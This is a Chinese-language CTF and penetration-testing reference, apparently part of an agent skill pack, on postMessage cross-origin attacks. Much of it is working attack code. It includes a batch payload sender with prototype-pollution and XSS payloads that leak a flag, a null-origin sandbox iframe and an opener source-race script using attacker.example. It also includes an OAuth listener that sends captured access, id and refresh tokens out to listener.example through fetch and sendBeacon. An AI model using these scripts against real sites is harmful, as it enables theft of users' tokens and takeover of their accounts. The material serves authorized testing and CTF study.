# PostMessage / 跨域通信攻击

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/07-client/postmessage.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「postMessage / 跨域通信 / null origin / OAuth token」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- postMessage
- 跨域通信
- null origin
- OAuth token
- prototype pollution
- event.source
- structured clone
- iframe

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。

## 步骤

1. **callback 页面 `opener.postMessage(token, "*")`** — access_token/id_token 到达 listener
2. **iframe silent refresh** — refresh 结果外带
3. **redirect proxy** — code/token 发给 attacker window

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — 可控 origin/data 进入敏感分支
- **失败样本** — handler 只记录日志
- **命中样本** — opener/iframe 收到敏感数据
- **失败样本** — 回包只有 public 状态
- **命中样本** — 非目标 origin 通过
- **失败样本** — 精确等值匹配
- **命中样本** — source 引用保留但内容被替换
- **失败样本** — 每次重新验证 origin
- **命中样本** — `isAdmin`、redirect、HTML sink 被污染
- **失败样本** — schema validator 拒绝
- **成功样本** — access_token/id_token 到达 listener
- **成功样本** — refresh 结果外带
- **成功样本** — code/token 发给 attacker window

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

postMessage 攻击不是盲发 JSON，而是还原接收端的四件事：谁能发、发什么 schema、触发什么动作、响应发给谁。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| JS 中有 `addEventListener("message"` | 抽 handler、origin 检查和 data 分支 | 可控 origin/data 进入敏感分支 | handler 只记录日志 |
| `postMessage(..., "*")` | 找 token/flag/redirect 回包 | opener/iframe 收到敏感数据 | 回包只有 public 状态 |
| 检查 `event.origin.includes/endsWith` | 构造 sibling/eTLD/null origin | 非目标 origin 通过 | 精确等值匹配 |
| 检查 `event.source` | opener/iframe 导航 race | source 引用保留但内容被替换 | 每次重新验证 origin |
| data 进入 merge/render/eval | schema fuzz + PP/XSS | `isAdmin`、redirect、HTML sink 被污染 | schema validator 拒绝 |

## 工作流

```text
定位 message handler
  → 抽 origin/source/schema/action
  → 建立 iframe/opener harness
  → 批量发送 origin 与 data 变体
  → 捕获回包、DOM 变化、网络请求
  → 按命中动作转 OAuth/JWT/XSS/PP 链
```

## 0. 判定矩阵

| 检查方式 | Payload | 命中样本 | 失败样本 |
|---|---|---|---|
| `origin === trusted` | 子域、协议降级、punycode | 非 trusted 进入 handler | 固定拒绝 |
| `origin.includes("target.com")` | `https://target.com.attacker.test` | 通过 includes | 使用 URL parser |
| `origin === "null"` 或未处理 null | sandbox iframe / data URL | null origin 可执行动作 | null 被拒 |
| `source === iframe.contentWindow` | 导航 iframe 到 attacker | source 仍通过 | 导航后重新绑定 |
| `data.type/action` | admin/getFlag/token/export | 返回敏感字段 | 只返回 ack |
| deep merge | `__proto__`, `constructor.prototype` | 全局对象被污染 | structured clone 后被净化或 schema 拒绝 |

## 1. Handler 提取

```javascript
(() => {
  const oldAdd = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function(type, fn, opts) {
    if (type === "message") {
      console.log("[pm-handler]", location.href, fn && fn.toString().slice(0, 1200));
      debugger;
    }
    return oldAdd.call(this, type, fn, opts);
  };
  window.addEventListener("message", e => {
    console.log("[pm-observe]", {
      origin: e.origin,
      source: !!e.source,
      data: e.data
    });
  }, true);
})();
```

成功样本：console 里出现 handler 源码、分支关键字、`postMessage` 回包。失败样本：页面无 handler 或 handler 延迟加载，需要导航后再注入 hook。

## 2. 批量 payload 发送器

```html
<!doctype html>
<meta charset="utf-8">
<iframe id="t" src="https://target.example/page.html"></iframe>
<script>
const payloads = [
  {type: "ping"},
  {type: "getFlag"},
  {type: "admin", cmd: "export"},
  {action: "oauth", access_token: "probe"},
  {"__proto__": {isAdmin: true}},
  {constructor: {prototype: {role: "admin"}}},
  {type: "render", html: "<img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>parent.postMessage({leak:t},'*'))>"}
];
window.addEventListener("message", e => {
  fetch("https://listener.example/pm", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify({origin: e.origin, data: e.data})
  });
});
t.onload = () => {
  for (const p of payloads) {
    t.contentWindow.postMessage(p, "*");
  }
};
</script>
```

## 3. null origin 与 source race

```html
<iframe sandbox="allow-scripts allow-forms allow-popups" srcdoc="
<script>
parent.postMessage({type:'getFlag', reply:'parent'}, '*');
</script>
"></iframe>
```

```html
<script>
const w = window.open("https://target.example/trusted.html");
setTimeout(() => { w.location = "https://attacker.example/relay.html"; }, 800);
setTimeout(() => { w.postMessage({type:"export", target:"admin"}, "*"); }, 1600);
window.addEventListener("message", e => {
  navigator.sendBeacon("https://listener.example/source", JSON.stringify({origin:e.origin, data:e.data}));
});
</script>
```

判定：如果 handler 只保存 `source` 引用，导航后仍可能被当作 trusted window；如果每次同时校验 `origin` 与 action schema，这条线通常终止。

## 4. OAuth / token 回包

| 场景 | 动作 | 成功样本 |
|---|---|---|
| callback 页面 `opener.postMessage(token, "*")` | attacker opener 接收 | access_token/id_token 到达 listener |
| iframe silent refresh | 嵌入 OAuth iframe，监听回包 | refresh 结果外带 |
| redirect proxy | 改 `redirect_uri/state` 与 opener | code/token 发给 attacker window |

```javascript
window.addEventListener("message", e => {
  if (JSON.stringify(e.data).match(/access_token|id_token|refresh_token|code/)) {
    fetch("https://listener.example/oauth", {method:"POST", mode:"no-cors", body:JSON.stringify({origin:e.origin, data:e.data})});
  }
});
```

## 5. structured clone 与 PP

```javascript
const evil = /flag/g;
evil.lastIndex = 999999;
target.postMessage({type:"validate", pattern: evil}, "*");
target.postMessage({"__proto__": {isAdmin: true, apiBase: "/admin"}}, "*");
target.postMessage({constructor: {prototype: {role: "admin"}}}, "*");
```

成功样本：接收端正则结果、全局 config、权限字段或 DOM 渲染发生变化。失败样本：`structuredClone` 后字段被 schema 校验剔除，或 action 白名单不含敏感动作。

## 攻击链

```text
handler 定位
  → origin/source/schema 差分
  → null origin / source race / wildcard 回包
  → token 或敏感动作命中
  → 转 OAuth/JWT/XSS/PP 下一跳
```

## Evidence

| 项 | 记录内容 |
|---|---|
| handler | 文件 URL、函数片段、origin/source 检查、action 分支 |
| harness | iframe/opener/null-origin 构造、发送 payload、目标 URL |
| oracle | 回包 data、DOM 变化、网络请求、listener 日志 |
| 成功样本 | token/flag/admin 数据回包，或敏感 action 被执行 |
| 失败样本 | origin 精确拒绝、schema reject、source mismatch、同一 ack |
| 下一跳 | OAuth token 转 `20-oauth-deep`；JWT 转 `02-auth/jwt`；HTML sink 转 admin-bot-xss |
